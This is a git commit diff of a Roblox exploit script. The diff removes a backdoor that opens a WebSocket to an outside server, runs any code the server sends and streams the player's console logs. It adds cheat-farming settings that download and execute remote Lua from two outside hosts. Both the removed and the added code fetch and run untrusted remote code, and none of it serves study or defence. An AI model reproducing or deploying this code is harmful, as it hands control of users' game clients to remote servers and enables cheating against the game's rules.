bd4ccf3f19faa320e63a6cf79b124e7b7e4c8702
Teus-Scripts <mateusboaventura779@gmail.com>
2024-09-30 04:46:02 -0300

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,59 +1,16 @@
--- This file was generated using Luraph Obfuscator v14.1 [https://lura.ph/]
-spawn(function() 
-local LocalPlayer = game.Players.LocalPlayer
-
-local HttpService = game:GetService("HttpService"); 
-local LogService = game:GetService("LogService"); 
-getgenv().print = function() end
-
-local GC = getconnections or get_signal_cons
-    if GC then
-        for i,v in pairs(GC(game.Players.LocalPlayer.Idled)) do
-            if v["Disable"] then
-                v["Disable"](v)
-            elseif v["Disconnect"] then
-                v["Disconnect"](v)
-            end
-        end
-    else
-        local VirtualUser = game:GetService("VirtualUser")
-        Players.LocalPlayer.Idled:Connect(function()
-            VirtualUser:CaptureController()
-            VirtualUser:ClickButton2(Vector2.new())
-        end)
-    end
-
-local Connection = getgenv().WebSocket.connect("wss://adu-0nny.onrender.com/?token=haha&isClient=true&clientName="..LocalPlayer.Name)
-
- LogContentType = {"Output", "Info", "Warning", "Error"}
-
-
-Connection.OnMessage:Connect(function(msg)
-
-    du = HttpService:JSONDecode(msg) 
-    if du.type == "execute" then 
-       loadstring(du.data)()
-    end
-end) 
-
-
-function Send(Content, Type) 
-    Connection:Send(HttpService:JSONEncode({
-            type = "emitConsole", 
-            data = 
-            {
-                Type = Type, 
-                Date = os.time(), 
-                From = LocalPlayer.Name, 
-                Content = Content
-            }
-        })) 
-end 
-
-Send("Loaded", "Info")
-LogService.MessageOut:Connect(function(Content, Type) 
-    local Vcl = Enum.MessageType
-    Send(Content, (Type == Vcl.MessageOutput and "Output") or (Type == Vcl.MessageInfo and "Info") or (Type == Vcl.MessageWarning and "Warning") or (Type == Vcl.MessageError and "Error"))
-end)
-    end)
-loadstring(game:HttpGet("https://github.com/eltrul/about-myself/blob/main/SwitchKaitun.lua?raw=true"))()
+-- Max level, godhuman, CDK
+getgenv().Configs = {
+    ["Team"] = "Pirates",
+    ["FPS Boost"] = true,
+    ["Farm Boss Drops"] = {
+        ["Enable"] = true,
+        ["When x2 Exp Expired"] = true
+    },
+    ["Hop Player Near"] = false
+}
+loadstring(game:HttpGet("http://apixerohub.x10.mx/kaitun.lua"))()
+-- Fps try hard
+_G.whiteScreen = false
+_G.fps = 120
+_G.Mode = true
+loadstring(game:HttpGet('https://raw.githubusercontent.com/AloneBiNgu/AloneHub/main/lag'))()
